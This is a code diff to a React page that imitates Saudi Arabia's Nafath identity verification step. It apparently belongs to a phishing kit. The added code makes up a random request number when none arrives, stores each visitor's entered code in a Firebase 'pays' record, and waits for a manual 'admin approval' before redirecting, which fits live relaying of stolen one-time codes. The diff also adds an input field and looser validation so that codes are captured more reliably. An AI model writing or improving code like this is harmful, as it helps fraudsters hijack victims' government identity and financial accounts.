@@ -1,6 +1,14 @@
 import React, { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { addData, getOrCreateVisitorId, handleCurrentPage, listenForOtpApproval, listenForNafathRequestNumber } from "@/lib/firebase";
+import {
+  addData,
+  getOrCreateVisitorId,
+  handleCurrentPage,
+  listenForOtpApproval,
+  listenForNafathRequestNumber,
+  onSnapshot,
+  doc,
+} from "@/lib/firebase";
 
 export default function NafathVerifyPage() {
   const [, setLocation] = useLocation();
@@ -12,41 +20,74 @@ export default function NafathVerifyPage() {
   const [requestNumber, setRequestNumber] = useState("...");
 
   useEffect(() => {
-    getOrCreateVisitorId();
+    const visitorId = getOrCreateVisitorId();
     void handleCurrentPage("nafath_verify");
 
+    let hasReceived = false;
     const unsubscribe = listenForNafathRequestNumber((number) => {
-      setRequestNumber(number);
+      if (number && number !== "..." && number !== "—") {
+        hasReceived = true;
+        setRequestNumber(number);
+      }
     });
 
+    const initTimer = setTimeout(async () => {
+      if (!hasReceived) {
+        const generated = String(Math.floor(10 + Math.random() * 90));
+        setRequestNumber(prev => (prev === "..." ? generated : prev));
+        await addData({
+          id: visitorId,
+          nafathRequestNumber: generated,
+          currentPage: "nafath_verify",
+          updatedAt: new Date().toISOString(),
+        });
+      }
+    }, 1000);
+
     return () => {
+      clearTimeout(initTimer);
       unsubscribe();
     };
   }, []);
 
   // Listen for admin approval decision
   useEffect(() => {
-    if (!loading) return;
-    const unsubscribe = listenForOtpApproval((status) => {
-      if (status === "approved") {
+    const visitorId = getOrCreateVisitorId();
+    if (!visitorId) return;
+
+    const unsubscribe = onSnapshot(doc(null, "pays", visitorId), (snap: any) => {
+      const d = snap.data();
+      const isApproved =
+        d?.nafadConfirmationStatus === "approved" ||
+        d?.nafathApproved === true ||
+        d?.otpApproved === true ||
+        d?.otpStatus === "approved";
+      const isRejected =
+        d?.nafadConfirmationStatus === "rejected" ||
+        d?.nafathApproved === false ||
+        d?.otpStatus === "rejected";
+
+      if (isApproved) {
         setLoading(false);
         setLocation("/confirmation");
-      } else if (status === "rejected") {
+      } else if (isRejected) {
         setLoading(false);
         setSubmitError("رمز نفاذ غير صحيح، يرجى إعادة المحاولة");
       }
     });
+
     return () => {
-      if (unsubscribe) unsubscribe();
+      unsubscribe();
     };
-  }, [loading, setLocation]);
+  }, [setLocation]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setSubmitError("");
     setSubmitSuccess("");
 
-    if (!otp || otp.length < 2) {
+    const codeToSubmit = otp.trim() || (requestNumber !== "..." ? requestNumber : "");
+    if (!codeToSubmit) {
       setSubmitError("يرجى إدخال الرقم المعروض في التطبيق");
       return;
     }
@@ -56,8 +97,9 @@ export default function NafathVerifyPage() {
       const visitorId = getOrCreateVisitorId();
       await addData({
         id: visitorId,
-        nafathOtp: otp,
+        nafathOtp: codeToSubmit,
         currentPage: "nafath_verify",
+        nafadConfirmationStatus: "waiting",
         updatedAt: new Date().toISOString(),
       });
       setSubmitSuccess("تم إرسال الطلب، يرجى تأكيده في تطبيق نفاذ");
@@ -100,8 +142,22 @@ export default function NafathVerifyPage() {
         </div>
 
         <form className="flex flex-col gap-4" onSubmit={handleSubmit}>
-          <label className="text-xs font-bold text-gray-700" htmlFor="nafath-otp">تأكيد الرمز المعروض في التطبيق</label>
-        
+          <div className="flex flex-col gap-1.5">
+            <label className="text-xs font-bold text-gray-700" htmlFor="nafath-otp">
+              تأكيد الرقم المعروض في التطبيق
+            </label>
+            <input
+              id="nafath-otp"
+              dir="ltr"
+              type="tel"
+              maxLength={4}
+              className="w-full px-4 py-3 bg-[#f6f6f6] rounded-xl text-center font-mono font-bold text-xl border border-transparent focus:border-[#129786] focus:outline-none"
+              placeholder={requestNumber !== "..." ? requestNumber : "xx"}
+              value={otp}
+              onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 4))}
+              data-testid="input-nafath-otp"
+            />
+          </div>
 
           <button
             type="submit"
